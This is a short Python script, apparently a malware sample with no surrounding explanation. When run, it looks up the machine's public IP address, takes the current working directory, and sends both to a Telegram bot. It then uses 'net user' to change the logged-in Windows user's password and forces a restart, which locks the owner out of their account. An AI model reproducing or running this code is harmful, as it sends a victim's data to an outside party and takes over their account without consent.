import os
import requests



class send:
    def __init__(self):
        url = 'https://httpbin.org/ip'
        re = requests.get(url).text
        cwd = os.getcwd()

        requests.get(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text="+str(re+'\n'+cwd))



def change():
    os.system(f"net user %username% {your-pass}")
    os.system("shutdown -r")



if __name__ == '__main__':
    send()
    change()
